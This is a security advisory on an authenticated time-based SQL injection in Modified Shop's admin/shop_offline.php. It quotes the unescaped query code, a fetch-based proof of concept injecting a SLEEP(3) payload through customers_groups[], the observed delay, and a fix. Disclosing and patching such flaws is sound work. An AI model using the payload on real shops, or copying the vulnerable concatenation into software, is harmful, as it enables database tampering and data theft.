# Advisory — Authenticated SQL Injection in `admin/shop_offline.php`

## Summary

The administrative endpoint `admin/shop_offline.php` directly concatenates user-controlled values from the `customers_groups[]` parameter into an SQL `UPDATE` statement.

An authenticated administrator can alter the query structure and execute SQL expressions against the application's database.

## Classification

- **Type:** Authenticated, time-based SQL Injection (SQLi)
- **CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command
- **Severity:** High
- **Suggested CVSS 3.1:** 8.0 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
- **Component:** `/admin/shop_offline.php`
- **Evaluated version:** Modified Shop 3.3.0 rev. 16825

## Code Evidence

File:

```text
/home/bl4dsc4n/labs/modified-shop/src/admin/shop_offline.php
```

Relevant code:

```php
if (isset($_POST['customers_groups'])) {
  foreach ($_POST['customers_groups'] as $b) {
    $group_ids .= 'c_' . $b . "_group ,";
  }
}
```

The `$group_ids` value is used in the query without escaping:

```php
xtc_db_query(
  "UPDATE shop_configuration SET configuration_value= '" .
  $group_ids .
  "' WHERE configuration_key = 'SHOP_OFFLINE_ALLOWED_CUSTOMERS_GROUPS'"
);
```

There is no numeric conversion, allowlist validation, or call to `xtc_db_input()` before concatenation.

## Reproduction

The request must be sent with a valid administrative session:

```js
(async () => {
  const body = new URLSearchParams();

  body.set("go", "1");
  body.set("shop_offline", "checked");
  body.set("offline_msg", "lab");
  body.set("customers_emails", "");
  body.append(
    "customers_groups[]",
    "x' , configuration_value=IF(SLEEP(3),configuration_value,configuration_value) WHERE configuration_key='SHOP_OFFLINE_ALLOWED_CUSTOMERS_GROUPS' #"
  );

  const start = performance.now();

  const response = await fetch("/admin/shop_offline.php", {
    method: "POST",
    credentials: "same-origin",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body
  });

  console.log({
    status: response.status,
    elapsed_ms: Math.round(performance.now() - start),
    final_url: response.url
  });
})();
```

### Observed Result

The time-based test produced a delay of approximately three seconds, consistent with the execution of `SLEEP(3)` by the database.

As additional evidence, a validation run temporarily stored the injected value in the configuration:

```text
SHOP_OFFLINE_ALLOWED_CUSTOMERS_GROUPS = c_x
```

After validation, the following values were restored to the laboratory defaults:

```text
SHOP_OFFLINE = ''
SHOP_OFFLINE_ALLOWED_CUSTOMERS_GROUPS = ''
SHOP_OFFLINE_MSG = original seed message
```

## Impact

An authenticated administrator with access to the endpoint may:

- execute arbitrary SQL queries within the permissions of the database user;
- read data stored by the application;
- modify application settings and records;
- potentially cause a denial of service or compromise the application's integrity.

## Recommended Fix

Validate group identifiers as numeric values before constructing the configuration value:

```php
$group_ids = [];

foreach ((array)$_POST['customers_groups'] as $group_id) {
  $group_id = (int)$group_id;
  if ($group_id > 0) {
    $group_ids[] = 'c_' . $group_id . '_group';
  }
}

$group_ids = implode(',', $group_ids);

xtc_db_query(
  "UPDATE " . TABLE_CONFIGURATION .
  " SET configuration_value='" . xtc_db_input($group_ids) . "'" .
  " WHERE configuration_key='SHOP_OFFLINE_ALLOWED_CUSTOMERS_GROUPS'"
);
```

Using a parameterized data-access layer and keeping CSRF protection enabled in production environments is also recommended.

**Confirmed and reproducible in an authorized laboratory environment.**
